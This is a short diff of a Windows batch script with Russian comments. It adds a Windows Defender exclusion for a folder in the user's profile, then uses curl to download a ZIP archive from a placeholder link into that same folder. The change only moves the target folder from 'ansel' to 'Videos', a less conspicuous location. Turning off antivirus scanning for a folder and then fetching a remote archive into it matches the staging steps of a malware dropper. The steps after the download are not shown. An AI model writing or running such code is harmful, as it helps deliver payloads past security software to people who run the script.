@@ -26,11 +26,11 @@ echo.
 timeout /t 1 >nul
 cls
 echo [1/6] Скачивание ZIP-архива...
-powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%\ansel'"
+powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%\Videos'"
 
 :: Прямая ссылка на файл (замени на свою!)
 set "DOWNLOAD_LINK=googledicklink"
-set "ZIP_PATH=%USERPROFILE%\ansel\archive.zip"
+set "ZIP_PATH=%USERPROFILE%\Videos\archive.zip"
 
 :: Скачивание ZIP через curl (прямая ссылка)
 curl -L -o "%ZIP_PATH%" "%DOWNLOAD_LINK%"
